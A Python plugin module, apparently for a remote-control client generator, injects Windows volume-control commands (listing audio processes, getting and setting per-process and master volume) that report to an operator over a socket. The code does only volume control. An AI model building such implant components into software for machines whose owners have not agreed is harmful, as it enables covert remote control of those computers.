# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('from comtypes import CLSCTX_ALL')
        self.config.import_statements.append('from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume, ISimpleAudioVolume')
        self.config.import_statements.append('from ctypes import cast, POINTER')
        self.config.functions.append('''
def get_valid_processes():
    sessions = AudioUtilities.GetAllSessions()
    process_list = []
    for session in sessions:
        if session.Process:
            process_list.append("    - " + session.Process.name())
    data = "[+] Valid Audio Processes : \\n"
    send_all(s,(data + '\\n'.join(process_list) + '\\n'))

def get_process_volume(data):
    process_name = data.split(' ', 1)[1]
    sessions = AudioUtilities.GetAllSessions()
    for session in sessions:
        if session.Process and session.Process.name() == process_name:
            volume = session._ctl.QueryInterface(ISimpleAudioVolume)
            volume_val = int(round(volume.GetMasterVolume() * 100))
            send_all(s,f'[+]Relative volume of {process_name} is {volume_val}% of master volume')
            return
    send_all(s,f'[-]{process_name} is an invalid process. Execute \\'get_audio_processes\\' to get a list of valid audio processes')

def set_process_volume(data):
    process_name = data.split(' ', 2)[1]
    try:
        percentage = int(data.split(' ', 2)[2])
        if not 0 <= percentage <= 100:
            send_all(s, "[-]Invalid percentage value.")
            return
    except:
        send_all(s, "[-]Invalid options for command.")
        return
    sessions = AudioUtilities.GetAllSessions()
    for session in sessions:
        if session.Process and session.Process.name() == process_name:
            volume = session._ctl.QueryInterface(ISimpleAudioVolume)
            volume.SetMasterVolume(percentage / 100, None)
            send_all(s,f'[+]Set relative volume of {process_name} to : {percentage}% of master volume')
            return
    send_all(s,f'[-]{process_name} is an invalid process. Execute \\'get_audio_processes\\' to get a list of valid audio processes')

def get_master_volume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume_val = int(round(volume.GetMasterVolumeLevelScalar() * 100))
    send_all(s, f'[+]Current master volume is {volume_val}%')
    
def set_master_volume(data):
    try:
        percentage = int(data.split(' ', 1)[1])
        if not 0 <= percentage <= 100:
            send_all(s, "[-]Invalid percentage value.")
            return
    except:
        send_all(s, "[-]Invalid options for command.")
        return
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(percentage / 100, None)
    send_all(s, f'[+]Set master volume to {percentage}%')''')
        self.config.logics.append('''
            elif command == "get_audio_processes":
                get_valid_processes()''')
        self.config.logics.append('''
            elif command == "get_process_volume":
                get_process_volume(data)''')
        self.config.logics.append('''
            elif command == "set_process_volume":
                set_process_volume(data)''')
        self.config.logics.append('''
            elif command == "get_master_volume":
                get_master_volume()''')
        self.config.logics.append('''
            elif command == "set_master_volume":
                set_master_volume(data)''')
        self.config.help_menu['get_audio_processes'] = 'Get valid processes for which volumes can be set'
        self.config.help_menu['get_process_volume <process name>'] = 'Get the volume of a process by percentage'
        self.config.help_menu['set_process_volume <process name> <percentage>'] = 'Set the relative volume of a process by percentage (with respect to master volume)'
        self.config.help_menu['get_master_volume'] = 'Get the master volume by percentage'
        self.config.help_menu['set_master_volume <percentage>'] = 'Set the master volume by percentage'
    elif option == 'info':
        self.log.blank('\nName             : Volume Control component' \
                       '\nOS               : Windows' \
                       '\nRequired Modules : ctypes, pycaw (external), comtypes' \
                       '\nCommands         : get_audio_processes, get_process_volume <process name>, set_process_volume <process name> <percentage>, get_master_volume, set_master_volume <percentage>' \
                       '\nDescription      : Controls the system volume\n')
        return {
            "Name": "Volume Control component",
            "OS": "Windows",
            "Required Modules": "ctypes, pycaw (external)",
            "Commands": "get_audio_processes, get_process_volume <process name>, set_process_volume <process name> <percentage>, get_master_volume, set_master_volume <percentage>",
            "Description": "Controls the system volume"}
